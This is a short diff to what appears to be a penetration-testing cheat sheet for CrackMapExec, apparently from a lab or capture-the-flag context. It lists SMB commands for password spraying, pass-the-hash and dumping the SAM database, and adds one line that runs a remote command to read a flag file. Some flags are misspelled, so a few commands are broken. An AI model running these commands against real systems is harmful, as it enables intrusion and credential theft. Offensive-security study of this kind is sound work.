@@ -1,4 +1,5 @@
 **Crackmapexec**:  
+crackmapexec smb -u soda -p soda 10.1.1.1/24 -x "type C:\flag.txt"  
 crackmapexec smb 10.1.1.10/24 -u fcastle -d marvel.local -p Password1  //pass the password  
 crackmapexec smb 10.1.1.0/24 -u adminisrator -H NTLM:HASH --local-auth  //local auth  
 crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auh --sam  //dump sam  
